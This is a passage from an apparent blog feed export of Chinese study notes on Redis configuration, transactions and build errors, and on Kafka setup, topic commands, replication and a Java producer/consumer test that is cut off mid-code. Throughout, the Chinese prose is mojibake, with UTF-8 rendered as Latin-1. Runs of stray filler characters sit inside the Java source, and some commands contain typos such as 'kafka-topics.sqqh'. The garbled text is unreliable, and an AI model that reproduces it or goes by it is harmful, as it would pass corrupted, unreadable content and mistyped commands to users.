çš„ VM æœºåˆ¶ï¼‰ vm-enabled no 22ã€è™šæ‹Ÿå†…å­˜æ–‡ä»¶è·¯å¾„ï¼Œé»˜è®¤å€¼ä¸º/tmp/redis.swapï¼Œä¸å¯å¤šä¸ª Redis å®ä¾‹å…±äº« vm-swap-file /tmp/redis.swap 23ã€å°†æ‰€æœ‰å¤§äº vm-max-memory çš„æ•°æ®å­˜å…¥è™šæ‹Ÿå†…å­˜,æ— è®º vm-max-memory è®¾ç½®å¤šå°,æ‰€ æœ‰ç´¢å¼•æ•°æ®éƒ½æ˜¯å†…å­˜å­˜å‚¨çš„(Redis çš„ç´¢å¼•æ•°æ® å°±æ˜¯ keys),ä¹Ÿå°±æ˜¯è¯´,å½“ vm-max-memory è®¾ ç½®ä¸º 0 çš„æ—¶å€™,å…¶å®æ˜¯æ‰€æœ‰ value éƒ½å­˜åœ¨äºç£ç›˜ã€‚é»˜è®¤å€¼ä¸º 0 vm-max-memory 0 24ã€Redis swap æ–‡ä»¶åˆ†æˆäº†å¾ˆå¤šçš„ pageï¼Œä¸€ä¸ªå¯¹è±¡å¯ä»¥ä¿å­˜åœ¨å¤šä¸ª page ä¸Šé¢ï¼Œä½†ä¸€ä¸ª page ä¸Šä¸èƒ½è¢«å¤šä¸ªå¯¹è±¡å…±äº«ï¼Œvm-page-size æ˜¯è¦æ ¹æ®å­˜å‚¨çš„ æ•°æ®å¤§å°æ¥è®¾å®šçš„ï¼Œä½œè€…å»ºè®®å¦‚ æœå­˜å‚¨å¾ˆå¤šå°å¯¹è±¡ï¼Œpage å¤§å°æœ€å¥½è®¾ç½®ä¸º 32 æˆ–è€… 64bytesï¼›å¦‚æœå­˜å‚¨å¾ˆå¤§å¤§å¯¹è±¡ï¼Œåˆ™å¯ ä»¥ä½¿ç”¨æ›´å¤§çš„ pageï¼Œå¦‚æœä¸ ç¡®å®šï¼Œå°±ä½¿ç”¨é»˜è®¤å€¼ vm-page-size 32 25ã€è®¾ç½® swap æ–‡ä»¶ä¸­çš„ page æ•°é‡ï¼Œç”±äºé¡µè¡¨ï¼ˆä¸€ç§è¡¨ç¤ºé¡µé¢ç©ºé—²æˆ–ä½¿ç”¨çš„ bitmapï¼‰æ˜¯ åœ¨æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œï¼Œåœ¨ç£ç›˜ä¸Šæ¯ 8 ä¸ª pages å°†æ¶ˆè€— 1byte çš„å†…å­˜ã€‚ vm-pages 134217728 26ã€è®¾ç½®è®¿é—® swap æ–‡ä»¶çš„çº¿ç¨‹æ•°,æœ€å¥½ä¸è¦è¶…è¿‡æœºå™¨çš„æ ¸æ•°,å¦‚æœè®¾ç½®ä¸º 0,é‚£ä¹ˆæ‰€æœ‰å¯¹ swap æ–‡ä»¶çš„æ“ä½œéƒ½æ˜¯ä¸²è¡Œçš„ï¼Œå¯èƒ½ä¼šé€ æˆæ¯”è¾ƒé•¿æ—¶é—´çš„å»¶è¿Ÿã€‚é»˜è®¤å€¼ä¸º 4 vm-max-threads 4 27ã€è®¾ç½®åœ¨å‘å®¢æˆ·ç«¯åº”ç­”æ—¶ï¼Œæ˜¯å¦æŠŠè¾ƒå°çš„åŒ…åˆå¹¶ä¸ºä¸€ä¸ªåŒ…å‘é€ï¼Œé»˜è®¤ä¸ºå¼€å¯ glueoutputbuf yes 28ã€æŒ‡å®šåœ¨è¶…è¿‡ä¸€å®šçš„æ•°é‡æˆ–è€…æœ€å¤§çš„å…ƒç´ è¶…è¿‡æŸä¸€ä¸´ç•Œå€¼æ—¶ï¼Œé‡‡ç”¨ä¸€ç§ç‰¹æ®Šçš„å“ˆå¸Œç®— æ³• hash-max-zipmap-entries 64 hash-max-zipmap-value 512 29ã€æŒ‡å®šæ˜¯å¦æ¿€æ´»é‡ç½®å“ˆå¸Œï¼Œé»˜è®¤ä¸ºå¼€å¯ï¼ˆåé¢åœ¨ä»‹ç» Redis çš„å“ˆå¸Œç®—æ³•æ—¶å…·ä½“ä»‹ç»ï¼‰ activerehashing yes 30ã€æŒ‡å®šåŒ…å«å…¶å®ƒçš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥åœ¨åŒä¸€ä¸»æœºä¸Šå¤šä¸ª Redis å®ä¾‹ä¹‹é—´ä½¿ç”¨åŒä¸€ä»½é…ç½®æ–‡ ä»¶ï¼Œè€ŒåŒæ—¶å„ä¸ªå®ä¾‹åˆæ‹¥æœ‰è‡ªå·±çš„ç‰¹å®šé…ç½®æ–‡ä»¶ include /path/to/local.conf 7.å…¶å®ƒéœ€è¦äº†è§£çš„æ·»åŠ æ³¨é‡Šçš„æŠ€å·§: æœ€å¥½çš„æ³¨é‡Šæ–¹å¼: å°‘è€Œç²¾ å®Œæˆä¸€æ®µå°é€»è¾‘çš„ä»£ç å°±åŠ ä¸ªæ³¨é‡Š å®¹æ˜“è´¹è§£çš„åœ°æ–¹åŠ æ³¨é‡Š æ‹“å±•: ç¼“å­˜æ·˜æ±°ç®—æ³• :TODONRU(Not recently used) FIFO(First-in, first-out) Second-chance LRU(Least recently Used) redis çš„å†…å­˜æ¨¡å‹ Hadoop3.0 æ–°ç‰¹æ€§æœºåˆ¶ çº åˆ ç  æœºåˆ¶ äº‹åŠ¡ 1234567891011121314151617181920212223242526272829303132# åŸºæœ¬æ“ä½œ127.0.0.1:6379&gt; multiOK127.0.0.1:6379&gt; set a 1QUEUED127.0.0.1:6379&gt; set b 2QUEUED127.0.0.1:6379&gt; set c 3QUEUED127.0.0.1:6379&gt; exec1) OK2) OK3) OK# ç›®å‰äº‹åŠ¡å­˜åœ¨çš„é—®é¢˜å¦‚æœä¸€æ¡å‘½ä»¤æ˜¯å› ä¸ºè¯­æ³•é”™è¯¯, äº‹åŠ¡æ•´ä½“æ‰§è¡Œä¸æˆåŠŸä½†æ˜¯å¦‚æœæ²¡æœ‰è¯­æ³•é”™è¯¯, è€Œæ˜¯ç±»å‹åˆ¤æ–­é”™è¯¯, äº‹åŠ¡é‡Œé¢èƒ½æ‰§è¡ŒæˆåŠŸçš„ä¼šæ‰§è¡ŒæˆåŠŸ, ä¸èƒ½æ‰§è¡ŒæˆåŠŸçš„å°±ä¸ä¼šæ‰§è¡ŒæˆåŠŸ, è¿™æ ·å°±ç ´åäº†äº‹åŠ¡çš„åŸå­æ€§127.0.0.1:6379&gt; multiOK127.0.0.1:6379&gt; set aa 1QUEUED127.0.0.1:6379&gt; set bb 2QUEUED127.0.0.1:6379&gt; SDIFF aa bbQUEUED127.0.0.1:6379&gt; set cc 4QUEUED127.0.0.1:6379&gt; exec1) OK2) OK3) (error) WRONGTYPE Operation against a key holding the wrong kind of value4) OK ç›‘å¬ 1234watch xxunwatchæœºåˆ¶: åœ¨äº‹åŠ¡ä¹‹å‰ç›‘å¬ä¸€ä¸ªå˜é‡çš„å˜åŒ–å¦‚æœä¸€ä¸ªå˜é‡æœ‰å˜åŒ–, é‚£ä¹‹åçš„äº‹åŠ¡å°±å–æ¶ˆæ‰§è¡Œ Redis ä¸­çš„äº‹åŠ¡ :TODO å‚è€ƒ CZ çš„ word æ–‡æ¡£ 8.Redis é”™è¯¯12345678910111213141516171819202122# é”™è¯¯1(error) MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because this instance is configured to report errors during writes if RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs for details about the RDB error.127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error noOK127.0.0.1:6379&gt; pingPONG# é”™è¯¯2cc: ../deps/hiredis/libhiredis.a: No such file or directorycc: ../deps/lua/src/liblua.a: No such file or directorycc: ../deps/geohash-int/geohash.o: No such file or directorycc: ../deps/geohash-int/geohash_helper.o: No such file or directorymake[1]: * [redis-server] Error 1make[1]: Leaving directory `/usr/local/src/redis-3.2.9/src'make: * [all] Error 2----------------è§£å†³åŠæ³•è¿›å…¥æºç åŒ…ç›®å½•ä¸‹çš„depsç›®å½•ä¸­æ‰§è¡Œmake geohash-int hiredis jemalloc linenoise luaç„¶åå†è¿›è¡Œ../makeç¼–è¯‘å°±å¯ä»¥äº†å† $&gt; sudo make PREFIX=/usr/local/redis install 9.å‚è€ƒèµ„æ–™æ–‡æ¡£PDF]]></content>
      <categories>
        <category>Hadoop</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Hadoop</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kafka]]></title>
    <url>%2F2018%2F07%2F01%2FHadoop%2F7-Flume%26Kafka%2FKafka%2F</url>
    <content type="text"><![CDATA[1.æ¦‚è§ˆåˆ†å¸ƒå¼æµå¤„ç†å¹³å°ã€‚ åˆ†å¸ƒå¼, å‰¯æœ¬, å®¹é”™çš„åˆ†å¸ƒå¼å­˜å‚¨æµ. åœ¨ç³»ç»Ÿä¹‹é—´æ„å»ºå®æ—¶æ•°æ®æµç®¡é“ã€‚ ä»¥topicåˆ†ç±»å¯¹è®°å½•è¿›è¡Œå­˜å‚¨ æ¯ä¸ªè®°å½•åŒ…å«key-value+timestamp æ¯ç§’é’Ÿç™¾ä¸‡æ¶ˆæ¯ååé‡ã€‚ Java çš„ JMS æœ‰2ç§æ¨¡å¼: å‘å¸ƒè®¢é˜…æ¨¡å¼( æ‹¿åˆ°çš„æ˜¯ copy) &amp; é˜Ÿåˆ—æ¨¡å¼(queue): kafka é€šè¿‡ group æŠŠè¿™ä¸¤ç§æ¨¡å¼å®Œç¾çš„ç»“åˆèµ·æ¥ å¦‚æœæƒ³è¦å®ç°queue æ¨¡å¼, å°±æŠŠæ¶ˆè´¹è€…æ”¾åœ¨åŒä¸€ç»„, æ­¤ç»„ä¸­åªèƒ½æœ‰ä¸€ä¸ªæˆå‘˜æ¥æ¶ˆè´¹æ­¤æ¶ˆæ¯ æƒ³è¦å®ç°å‘å¸ƒè®¢é˜…æ¨¡å¼, å°±æŠŠæ¯ä¸ªæ¶ˆè´¹è€…å„è‡ªä¸€ç»„, æ¯ä¸ªäººéƒ½å¯ä»¥æ‹¿åˆ°ä¸€ä¸ªæ¶ˆæ¯å‰¯æœ¬ å…³é”®è¯: producer //æ¶ˆæ¯ç”Ÿäº§è€… consumer //æ¶ˆæ¯æ¶ˆè´¹è€… consumer group //æ¶ˆè´¹è€…ç»„ kafka server //broker,kafkaæœåŠ¡å™¨ topic //ä¸»é¢˜,å‰¯æœ¬æ•°,åˆ†åŒº. zookeeper //hadoop namenoade + RM HA | hbase | kafka ä¼˜åŒ–æ–¹æ¡ˆ: æŠŠç£ç›˜æŒ‚è½½åœ¨æŸä¸ªç›®å½•, ç„¶åè®©è¿™ä¸ªç›®å½•, åªæ˜¯å­˜å‚¨æŸä¸ªåˆ†åŒºçš„æ•°æ® kafka çš„è¦ç‚¹ä¸€æ¡æ¶ˆæ¯æ˜¯å­˜åœ¨ä¸€ä¸ªåˆ†åŒºçš„ å‰¯æœ¬â€“å¯é æ€§ åˆ†åŒºâ€“é«˜æ•ˆæ€§ =&gt; å¹¶å‘è®¿é—® åˆ†åŒº(partition)æ˜¯ producer é€šè¿‡è´Ÿè½½å‡è¡¡é€‰æ‹©çš„ ä¸€ä¸ªåˆ†åŒºå­˜ç€å¤šæ¡æ¶ˆæ¯, æ¶ˆæ¯æ˜¯æœ‰åºçš„ ä¸€ä¸ªåˆ†åŒºå†…çš„æ¶ˆæ¯åªèƒ½è¢«ä¸€ä¸ªç»„å†…çš„ä¸€ä¸ªæˆå‘˜æ¶ˆè´¹ topic æ˜¯åœ¨ kafka server ä¸Š topic åŒ…å« å‰¯æœ¬æ•°, åˆ†åŒº producer &amp; consumer éƒ½æ˜¯é’ˆå¯¹ topic æ¥æ“ä½œçš„ kafka çš„ consumer æ˜¯æ‹‰æ¨¡å¼, ä» kafkaå»pull æ¶ˆæ¯, å®æ—¶è®¡ç®—æ¡†æ¶æœ‰å¤šå¤§èƒ½åŠ›, å°± pull å¤šå°‘ æ‰€ä»¥ kafka ä¸€èˆ¬éƒ½ç”¨åœ¨å®æ—¶/å‡†å®æ—¶ è®¡ç®—ä¸­ é¡ºåºè¯»å†™ è¿½åŠ æ•°æ®, æ˜¯è¿½åŠ åˆ°æœ€å è¯»å–æ˜¯ä»å¼€å¤´è¯»å– å¯ç”¨ offset è·³è½¬åˆ°æŒ‡å®šçš„æ•°æ®æ®µ æ•°æ®å¯é‡å¤æ¶ˆè´¹ Consumers ä¸€æ¡æ•°æ®åªèƒ½è¢«åŒç»„å†…ä¸€ä¸ªæˆå‘˜æ¶ˆè´¹ ä¸åŒç»„çš„å¯ä»¥æ¶ˆè´¹åŒä¸€ä¸ªæ•°æ® SSDè¯»å†™é€Ÿåº¦: 1200 ~ 3500 MB/s æ³¨æ„ç‚¹: Kafka çš„åˆ†åŒºæ•°, å¯ä»¥åŠ¨æ€è°ƒæ•´ Kafka çš„æ¯ä¸ªåˆ†åŒºéƒ½æœ‰å¯¹åº”çš„å†—ä½™æ•°é‡, é»˜è®¤æ˜¯1 æ¯ä¸ªåˆ†åŒºå¦‚æœæœ‰å¤šä¸ªå‰¯æœ¬, è¿™äº›å‰¯æœ¬ä¸­, ä¼šæœ‰ä¸€ä¸ªæ˜¯ active çš„çŠ¶æ€, è´Ÿè´£è¯»å†™, å…¶å®ƒçš„éƒ½æ˜¯ standby çš„çŠ¶æ€ å¯¹äºHDFSå’Œkafkaçš„ block partition å¯¹äºä¸åŒçš„æ–‡ä»¶æˆ–è€…topicæ¥è¯´ï¼Œéƒ½å¯ä»¥æœ‰ä¸åŒçš„å‰¯æœ¬æ•°ï¼(æ¯ä¸ª topic å¯ä»¥å•ç‹¬è®¾ç½®)è®¾ç½®çš„å‰¯æœ¬æ•°ä¸èƒ½è¶…è¿‡brokerçš„æ•°é‡ï¼ï¼ï¼ Kafka çš„å¤§è‡´å·¥ä½œæ¨¡å¼ï¼š1ã€å¯åŠ¨ ZooKeeper çš„ server 2ã€å¯åŠ¨ Kafka çš„ server 3ã€Producer ç”Ÿäº§æ•°æ®ï¼Œç„¶åé€šè¿‡ ZooKeeper æ‰¾åˆ° Brokerï¼Œå†å°†æ•°æ® push åˆ° Broker ä¿å­˜ 4ã€Consumer é€šè¿‡ ZooKeeper æ‰¾åˆ° Brokerï¼Œç„¶åå†ä¸»åŠ¨ pull æ•°æ® 2.å®‰è£… kafka12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273740.é€‰æ‹©cs1 ~ cs6, 6å°ä¸»æœºéƒ½å®‰è£…kafka---------------------------------------------------------------------1.å‡†å¤‡zkç•¥---------------------------------------------------------------------2.jdkç•¥---------------------------------------------------------------------3.taræ–‡ä»¶---------------------------------------------------------------------4.ç¯å¢ƒå˜é‡---------------------------------------------------------------------ç•¥5.é…ç½®kafka--------------------------------------------------------------------- [kafka/config/server.properties] ... # è¿™é‡Œæ¯å°ä¸ä¸€æ · broker.id=1 ... listeners=PLAINTEXT://:9092 ... # è¿™é‡Œæ¯å°ä¸ä¸€æ · advertised.listeners=PLAINTEXT://cs1:9092 host.name=cs1 ... log.dirs=/home/centos/kafka/logs ... zookeeper.connect=s201:2181,s202:2181,s203:21816.åˆ†å‘æ•´ä¸ªæ–‡ä»¶ &amp; ç¬¦å·é“¾æ¥, .zshrcé…ç½®æ–‡ä»¶, åŒæ—¶ä¿®æ”¹æ¯ä¸ªserver.properties æ–‡ä»¶çš„broker.idå‚æ•° ---------------------------------------------------------------------7.å¯åŠ¨kafkaæœåŠ¡å™¨--------------------------------------------------------------------- a)å…ˆå¯åŠ¨zk b)å¯åŠ¨kafka b1)å‰å°å¯åŠ¨ [cs2 ~ cs4] [ap@cs1]~% kafka-server-start.sh /home/ap/apps/kafka/config/server.properties b2)åå°å¯åŠ¨ # è¿™é‡Œæ—¥å¿—ç›´æ¥æ‰“å°åœ¨æ§åˆ¶å° $&gt; kafka-server-start.sh -daemon /home/ap/apps/kafka/config/server.properties [æˆ–è€…] # è¿™æ ·èƒ½æŠŠæ—¥å¿—è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ nohup kafka-server-start.sh /home/ap/apps/kafka/config/server.properties 1&gt;&lt;sub&gt;/kafka/logs/kafka_std.log 2&gt;&lt;/sub&gt;/kafka/logs/kafka_err.log &amp; c)éªŒè¯kafkaæœåŠ¡å™¨æ˜¯å¦å¯åŠ¨ $&gt;netstat -anop | grep 90928.åˆ›å»ºä¸»é¢˜ --------------------------------------------------------------------- [ap@cs2]~% kafka-topics.sh --create --zookeeper cs1:2181 --replication-factor 3 --partitions 3 --topic test9.æŸ¥çœ‹ä¸»é¢˜åˆ—è¡¨---------------------------------------------------------------------[ap@cs2]~% kafka-topics.sh --list --zookeeper cs1:218110.å¯åŠ¨æ§åˆ¶å°ç”Ÿäº§è€… (å‰ææ˜¯ æ“ä½œæœ¬æœº &amp; cs2 ä¸Šå·²ç»å¯åŠ¨kafkaæœåŠ¡)--------------------------------------------------------------------- æ³¨æ„ : producer ä¸ç›´æ¥è¿æ¥ zk, è€Œæ˜¯è¿æ¥ broker, ä¹Ÿå°±æ˜¯ kafka server. å…¶å®ƒçš„éƒ½æ˜¯è¿ zk å¦‚æœproducer è¿çš„æŸä¸€å°æŒ‚æ‰çš„è¯, å¯ä»¥åœ¨ --broker-list åé¢, åŠ ä¸Šå¤šå°æœåŠ¡å™¨,ç”¨é€—å·éš”å¼€ [ap@cs2]~% kafka-console-producer.sh --broker-list cs2:9092 --topic test11.å¯åŠ¨æ§åˆ¶å°æ¶ˆè´¹è€… (å‰ææ˜¯ æ“ä½œæœ¬æœº &amp; cs2 ä¸Šå·²ç»å¯åŠ¨å¡å¤«å¡æœåŠ¡)--------------------------------------------------------------------- # ä½¿ç”¨bootstrap-serverå‚æ•° æ›¿ä»£zookeeper Using the ConsoleConsumer with old consumer is deprecated and will be removed in a future major release. Consider using the new consumer by passing [bootstrap-server] instead of [zookeeper]. [ap@cs3]~% kafka-console-consumer.sh --bootstrap-server cs2:9092 --topic test --from-beginning12.åœ¨ç”Ÿäº§è€…æ§åˆ¶å°è¾“å…¥hello world--------------------------------------------------------------------- 3.kafkaé›†ç¾¤åœ¨zkçš„é…ç½®123456789101112131415161718192021222324/controller ===&gt; &#123;"version":1,"brokerid":202,"timestamp":"1490926369148"/controller_epoch ===&gt; 1/brokers/brokers/ids/brokers/ids/202 ===&gt; &#123;"jmx_port":-1,"timestamp":"1490926370304","endpoints":["PLAINTEXT://s202:9092"],"host":"s202","version":3,"port":9092&#125;/brokers/ids/203/brokers/ids/204 /brokers/topics/test/partitions/0/state ===&gt;&#123;"controller_epoch":1,"leader":203,"version":1,"leader_epoch":0,"isr":[203,204,202]&#125;/brokers/topics/test/partitions/1/state ===&gt;.../brokers/topics/test/partitions/2/state ===&gt;.../brokers/seqid ===&gt; null/admin/admin/delete_topics/test ===&gt;æ ‡è®°åˆ é™¤çš„ä¸»é¢˜, ä½†æ˜¯å®é™…åˆ é™¤å, è¿™é‡Œæ²¡å‡ºç°/isr_change_notification/consumers/xxxx//config 4.kafka ä¸»é¢˜&amp;å‰¯æœ¬æ“ä½œ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110---------------------------------------------------------------------PS: æŸ¥çœ‹å¸®åŠ©å¥—è·¯* å¦‚æœçœ‹ topic ç›¸å…³å¸®åŠ© * bin/kafka-topic.sh è„šæœ¬ç›´æ¥å›è½¦, æŸ¥çœ‹å¸®åŠ©---------------------------------------------------------------------æŸ¥çœ‹ä¸»é¢˜åˆ—è¡¨---------------------------------------------------------------------[ap@cs2]~% kafka-topics.sqqh --list --zookeeper cs1:2181åˆ›å»ºä¸»é¢˜--------------------------------------------------------- repliation_factor 2 partitions 5 $&gt;kafka-topics.sh --zookeeper cs2:2181 --replication-factor 2 --partitions 3 --create --topic test2 2 x 3 = 6 //ä¸ªæ–‡ä»¶å¤¹ 2ä»½å‰¯æœ¬, æ¯ä»½å‰¯æœ¬æœ‰3ä¸ªåˆ†åŒº æ€»åˆ†åŒºæ•°ä¸º 6 æ¯ä¸ªåˆ†åŒºéƒ½æœ‰ä¸€ä¸ª leader, follower å°±æ˜¯å…¶å®ƒçš„å‰¯æœ¬ åˆ é™¤ä¸»é¢˜------------------------------------------------------------[ap@cs2]~% kafka-topics.sh --zookeeper cs1:2181,cs2:2181,cs3:2181 --delete --topic kafka_test1æŸ¥çœ‹ä¸»é¢˜æè¿°--------------------------------------------------------[ap@cs2]~% kafka-topics.sh --zookeeper cs1:2181,cs2:2181,cs3:2181 --describe --topic kafka_test1å¢åŠ /åˆ é™¤åˆ†åŒºæ•°--------------------------------------------------------kafka-topics.sh \--alter \--zookeeper cs1:2181,cs2:2181,cs3:2181 \--topic kafka_test1 \--partitions 20--------------kafka-topics.sh \--alter \--zookeeper hadoop02:2181,hadoop03:2181,hadoop04:2181 \ --topic kafka_test \--replication-factor 2æŸ¥çœ‹æŸ topic æŸä¸ªåˆ†åŒºçš„åç§»é‡æœ€å¤§å€¼å’Œæœ€å°å€¼ :TODO å•¥æ„æ€??--------------------------------------------------------kafka-run-class.sh kafka.tools.GetOffsetShell --topic kafka_test1 --time -1 --broker-list cs1:9092,cs2:9092,cs3:9092 --partitions 1 é‡æ–°å¸ƒå±€åˆ†åŒºå’Œå‰¯æœ¬ï¼Œæ‰‹åŠ¨å†å¹³è¡¡ :TODO è¿˜æœªæµ‹è¯• ------------------------------------------------------------alter ä¼¼ä¹æ˜¯æœ‰é—®é¢˜çš„, createå¥½åƒæ²¡é—®é¢˜æ­¤å¥æ˜¯æ‰‹åŠ¨æŠŠåˆ†åŒºæ”¾åˆ° 203 &amp; 204ä¸Šäº† $&gt;kafka-topics.sh --alter --zookeeper s202:2181 --topic test2 --replica-assignment 203:204,203:204,203:204,203:204,203:204 æµ‹è¯• producer å‘æ¶ˆæ¯å, å­˜åœ¨æœ¬åœ°çš„logs ç›®å½•çš„æ–‡ä»¶--------------------------------------------------------------1. å¼€å¯ä¸€ä¸ªproducer, å‘æ¶ˆæ¯2. æŸ¥çœ‹æœ¬åœ° cd ~/kafka/logs3. æŸ¥çœ‹æ–‡ä»¶å¤§å°, æ‰¾å‡ºæ–‡ä»¶(ä¸€æ¬¡æ€§æŸ¥çœ‹) 1. [ap@cs1]~% xcall.sh "ls -lh kafka/logs/test2-*" å‰¯æœ¬--------------------------------------------------------------brokerå­˜æ”¾æ¶ˆæ¯ä»¥æ¶ˆæ¯è¾¾åˆ°é¡ºåºå­˜æ”¾ã€‚ç”Ÿäº§å’Œæ¶ˆè´¹éƒ½æ˜¯å‰¯æœ¬æ„ŸçŸ¥çš„ã€‚æ”¯æŒåˆ°n-1æ•…éšœã€‚æ¯ä¸ªåˆ†åŒºéƒ½æœ‰leaderï¼Œfollow.leaderæŒ‚æ‰æ—¶ï¼Œæ¶ˆæ¯åˆ†åŒºå†™å…¥åˆ°æœ¬åœ°logæˆ–è€…ï¼Œå‘ç”Ÿäº§è€…å‘é€æ¶ˆæ¯ç¡®è®¤å›æ‰§ä¹‹å‰ï¼Œç”Ÿäº§è€…å‘æ–°çš„leaderå‘é€æ¶ˆæ¯ã€‚æ–°leaderçš„é€‰ä¸¾æ˜¯é€šè¿‡isrè¿›è¡Œï¼Œç¬¬ä¸€ä¸ªæ³¨å†Œçš„followeræˆä¸ºleaderã€‚## kafkaæ”¯æŒå‰¯æœ¬æ¨¡å¼, å°±æ˜¯ producer å†™åˆ° brokerçš„ topicä¸­çš„ partition çš„å‰¯æœ¬æœºåˆ¶---------------------[åŒæ­¥å¤åˆ¶] 1.producerè”ç³»zkè¯†åˆ«leader 2.å‘leaderå‘é€æ¶ˆæ¯ 3.leadræ”¶åˆ°æ¶ˆæ¯å†™å…¥åˆ°æœ¬åœ°log 4.followerä»leader pullæ¶ˆæ¯ 5.followerå‘æœ¬åœ°å†™å…¥log 6.followerå‘leaderå‘é€ackæ¶ˆæ¯ 7.leaderæ”¶åˆ°æ‰€æœ‰followerçš„ackæ¶ˆæ¯ 8.leaderå‘producerå›ä¼ ack [å¼‚æ­¥å‰¯æœ¬]-------------------------------------------------------------- å’ŒåŒæ­¥å¤åˆ¶çš„åŒºåˆ«åœ¨äº leaderå†™å…¥æœ¬åœ°logä¹‹åï¼Œ ç›´æ¥å‘clientå›ä¼ ackæ¶ˆæ¯ï¼Œä¸éœ€è¦ç­‰å¾…æ‰€æœ‰followerå¤åˆ¶å®Œæˆã€‚ # kafka å‰¯æœ¬æ¨¡å¼ &amp; leader æœºåˆ¶ | å®˜æ–¹æ–‡æ¡£----------------------------------------------------ps : æ¨é€‰leaderè¿‡ç¨‹å°±æ˜¯followeråœ¨zkä¸­æ³¨å†Œè¿‡ç¨‹ï¼Œç¬¬ä¸€ä¸ªæ³¨å†Œå°±æ˜¯leaderThe process of choosing the new lead replica is that all followers' In-sync Replicas (ISRs) register themselves with ZooKeeper. The very first registered replica becomes the new lead replica, and the rest of the registered replicas become the followers.Kafka supports the following replication modes:â€¢ Synchronous replication: In synchronous replication, a producer first identifies the lead replica from ZooKeeper and publishes the message. As soon as the message is published, it is written to the log of the lead replica and all the followers of the lead start pulling the message, and by using a single channel, the order of messages is ensured. Each follower replica sends an acknowledgement to the lead replica once the message is written to its respective logs. Once replications are complete and all expected acknowledgements are received, the lead replica sends an acknowledgement to the producer.On the consumer side, all the pulling of messages is done from the lead replica.â€¢ Asynchronous replication: The only difference in this mode is that as soon as a lead replica writes the message to its local log, it sends the acknowledgement to the message client and does not wait for the acknowledgements from follower replicas. But as a down side, this mode does not ensure the message delivery in case of broker failure. 5.Kafka java API5.0 pom æ–‡ä»¶1234567891011121314151617181920212223242526272829&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.rox&lt;/groupId&gt; &lt;artifactId&gt;Kafka_Demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;kafka_2.11&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 5.1å®ç°æ¶ˆæ¯ç”Ÿäº§è€…ï¼Œå‘é€&amp;æ¥å— æ¶ˆæ¯12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package com.rox.kafkademo.test;import kafka.consumer.Consumer;import kafka.consumer.ConsumerConfig;import kafka.consumer.ConsumerIterator;import kafka.consumer.KafkaStream;import kafka.producer.KeyedMessage$;import org.junit.Test;import kafka.javaapi.producer.Producer;import kafka.producer.KeyedMessage;import kafka.producer.ProducerConfig;import java.util.HashMap;import java.util.List;import java.util.Map;import java.util.Properties;public class TestProducer &#123; ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ // å‘é€æ¶ˆæ¯ producer @Test public void testSend() &#123; Properties props = new Properties(); // brokeråˆ—è¡¨ props.put("metadata.broker.list","cs2:9092"); // ä¸²è¡ŒåŒ– props.put("serializer.class", "kafka.serializer.StringEncoder"); props.put("request.required.acks", "1"); //åˆ›å»ºç”Ÿäº§è€…é…ç½®å¯¹è±¡ ProducerConfig config = new ProducerConfig(props); //åˆ›å»ºç”Ÿäº§è€… Producer&lt;String, String&gt; producer = new Producer&lt;String, String&gt;(config); KeyedMessage&lt;String, String&gt; msg = new KeyedMessage&lt;String, String&gt;("test2", "100", "hello word fuck you kafka"); // å‘é€ producer.send(msg); System.out.println("å‘é€å®Œæˆ"); &#125;ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ï£¿ // æ¥æ”¶æ¶ˆæ¯ consumer @Test public void testConsumer() &#123; Properties props = new Properties(); props.put("zookeeper.connect", "cs2:2181"); props.put("group.id", "g2"); props.put("zookeeper.session.timeout.ms", "500"); props.put("auto.commit.interval.ms", "1000"); props.put("auto.offset.reset", "smallest"); // åˆ›å»ºæ¶ˆè´¹è€…é…ç½®å¯¹è±¡ ConsumerConfig config = new ConsumerConfig(props); Map&lt;String, Integer&gt; map = new HashMap&lt;String, 